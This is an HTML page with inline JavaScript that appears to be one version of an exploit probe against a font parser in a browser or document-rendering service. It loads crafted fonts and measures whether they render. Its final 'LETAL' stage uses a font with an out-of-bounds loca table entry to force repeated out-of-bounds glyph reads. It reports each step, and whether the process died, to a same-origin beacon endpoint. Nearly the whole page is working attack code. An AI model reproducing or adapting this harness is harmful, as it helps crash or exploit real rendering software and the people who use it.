<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<script src="runtime-derive/derive-runtime.js"></script>
<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
<title>FA-v37-fix — press-37: font-family SIN comillas-quote (bug mío) + CSS delay + f12 letal-USE</title></head>
<body><pre id="out">FA-v37-fix…<br><span id="rx" style="font-family:serif">A</span></pre>
<script>
(function(){
"use strict";
/* FA-v37-fix — press-37: en v35/v36 escribí font-family:'fef-f10, serif'
 * = UNA familia citada inválida → fallback. AHORA: sin comillas
 * (fel-f10 es un nombre CSS válido sin comillas), canvas igual,
 * y rcss midiendo 1.2s DESPUÉS de inyectar (la carga CSS es async).
 * Rows: loads → r10/r10b/r11 (discriminador CORRECTO) → rcss → letal-last r12 (run×32). */
var RID="v37f"+Date.now().toString(36).slice(-13);
function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
var HB=setInterval(function(){bk("V37-HB","main-hb");},2000);

var dr="-",rt="-";
try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
var cv=document.createElement("canvas");
var ctx=null; var cvt="-";
try{ ctx=cv.getContext("2d"); cvt=ctx?"2d-ok":"no-2d"; }catch(e){ cvt="E"; }
bk("V37-L","v37-fix; dr="+dr+"; rt="+rt+"; canvas2d="+cvt);

function Trnd(){ return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36); }
function doLoad(id, f){
  bk("V37-E"+id, "enter-load "+id);
  try{
    var ff=new FontFace("fef-"+id, "url(/document/al/ps5/"+f+"?t="+Trnd()+")");
    document.fonts.add(ff);
    ff.load().then(function(){ bk("V37-R"+id, id+" load=OK"); },
                    function(err){ bk("V37-R"+id, id+" rechaza: "+String((err&&err.name)+" "+(err&&err.message)||err).slice(0,55)); });
  }catch(e){ bk("V37-R"+id, id+" E:"+String((e&&e.message)||e).slice(0,50)); }
}

var rx=document.getElementById("rx");
function measureDOM(fam, size, txt){
  var w="-";
  try{
    rx.setAttribute("style","font-family:"+fam+", serif;font-size:"+size+"px;");  /* SIN comillas-quote */
    rx.textContent=txt;
    w=Math.round(rx.getBoundingClientRect().width*10)/10;
  }catch(e){ w="E:"+String((e&&e.message)||e).slice(0,30); }
  try{ rx.removeAttribute("style"); rx.textContent="A"; }catch(e){}
  return w;
}
function cvRender(fam, txt){
  if(!ctx) return "no-2d";
  try{
    cv.width=260; cv.height=70;
    ctx.clearRect(0,0,260,70);
    ctx.font="40px "+fam+", serif";              /* SIN comillas-quote */
    ctx.fillStyle="#f00";
    ctx.fillText(txt,5,55);
    var d=ctx.getImageData(0,0,260,70).data;
    var sum=0; for(var i=0;i<d.length;i+=4) sum+=d[i];
    return "cv-sum="+sum;
  }catch(e){ return "cv-E:"+String((e&&e.message)||e).slice(0,35); }
}
function cssFont(fam, url){
  try{
    var old=document.getElementById("cfx-style");
    if(old) old.parentNode.removeChild(old);
    var s=document.createElement("style"); s.id="cfx-style";
    s.textContent="@font-face{font-family:"+fam+";src:url(/document/al/ps5/"+url+"?t="+Trnd()+");}";
    document.head.appendChild(s);
    return "css-inyectado";
  }catch(e){ return "css-E"; }
}

var RUN="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
setTimeout(function(){ doLoad("f10","f10.ttf"); }, 300);
setTimeout(function(){ doLoad("f11","f11.ttf"); }, 1200);
setTimeout(function(){ doLoad("f12","f12.ttf"); }, 2100);

setTimeout(function(){ bk("V37-Er10","enter r10");
  bk("V37-Rr10","r10: api-A="+measureDOM("fef-f10",40,"A")+" (80=NUESTRO; 27=fallback) | "+cvRender("fef-f10","A")); }, 3000);
setTimeout(function(){ bk("V37-Er10b","enter r10b");
  bk("V37-Rr10b","r10b: api-run32="+measureDOM("fef-f10",40,RUN)+" (2560=usado; 864=fallback)"); }, 4000);
setTimeout(function(){ bk("V37-Er11","enter r11");
  bk("V37-Rr11","r11: triángulo="+measureDOM("fef-f11",40,"A")+" | "+cvRender("fef-f11","A")); }, 5000);
setTimeout(function(){ bk("V37-Ercss","enter rcss");
  cssFont("cfx","f10.ttf");
  setTimeout(function(){ /* 1.2s tarde: dejamos que la CSS font cargue */
    bk("V37-Rrcss","rcss(css-delay-1.2s): css-A="+measureDOM("cfx",40,"A")+" (80=vía CSS activa)"); }, 1200); }, 6000);
/* LETAL-LAST: uso REAL de f12 (loca entry past-EOF): run×32 fuerza 32 accesos al glifo OOB */
setTimeout(function(){ bk("V37-Er12","enter r12-LETHAL-USE");
  var w=measureDOM("fef-f12",40,RUN); var c=cvRender("fef-f12",RUN);
  bk("V37-Rr12","r12: locaEOF-run="+w+" | "+c+" (sin Z = esta mató)"); }, 8000);
setTimeout(function(){ clearInterval(HB); bk("V37-Z","FA-v37-fix complete"); }, 10000);
setTimeout(function(){ clearInterval(HB); bk("V37-Z2","late-z(20s)"); }, 20000);
})();
</script></body></html>
